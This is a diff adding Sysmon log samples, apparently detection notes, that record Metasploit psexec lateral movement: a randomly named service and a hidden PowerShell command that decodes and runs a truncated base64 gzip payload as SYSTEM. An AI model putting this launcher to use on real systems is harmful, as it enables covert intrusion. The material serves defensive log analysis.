@@ -2,6 +2,52 @@
 ## SYSMON EVENTS USING THIS GITHUB CONFIG
 https://github.com/olafhartong/sysmon-modular
 
+##### Lateral movement using psexec technique from MSF
+Registry value set:
+RuleName: MitreRef=T1060,Technique=Registry Autorun Keys,Tactic=Persistence
+EventType: SetValue
+UtcTime: 2021-06-12 03:49:29.470
+ProcessGuid: {298db6a9-2c67-60c4-eeb3-000000000000}
+ProcessId: 620
+Image: C:\Windows\system32\services.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\DpRHdvsE\Start
+Details: DWORD (0x00000003)
+
+###### Second registry event
+Registry value set:
+RuleName: MitreRef=T1060,Technique=Registry Autorun Keys,Tactic=Persistence
+EventType: SetValue
+UtcTime: 2021-06-12 03:49:29.470
+ProcessGuid: {298db6a9-2c67-60c4-eeb3-000000000000}
+ProcessId: 620
+Image: C:\Windows\system32\services.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\DpRHdvsE\ImagePath
+Details: %%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAMguxGACA7shortentedforreadability''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
+
+###### Process create
+Process Create:
+RuleName: -
+UtcTime: 2021-06-12 03:49:29.500
+ProcessGuid: {298db6a9-2ec9-60c4-b0dc-320000000000}
+ProcessId: 2984
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.19041.546 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAMguxshortentedforreadability''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
+CurrentDirectory: C:\Windows\system32\
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {298db6a9-2c68-60c4-e703-000000000000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: MD5=321A50053155122E6ACE9691197A8E3F,SHA256=100348552B388AB5D0095BB09EBF0EBC22668092FB8E0F92AC7ED5909492B4F6,IMPHASH=272245E2988E1E430500B852C4FB5E18
+ParentProcessGuid: {298db6a9-2c67-60c4-eeb3-000000000000}
+ParentProcessId: 620
+ParentImage: C:\Windows\System32\services.exe
+ParentCommandLine: C:\Windows\system32\services.exe
 
 ##### PROCESS CREATE
 Process Create:
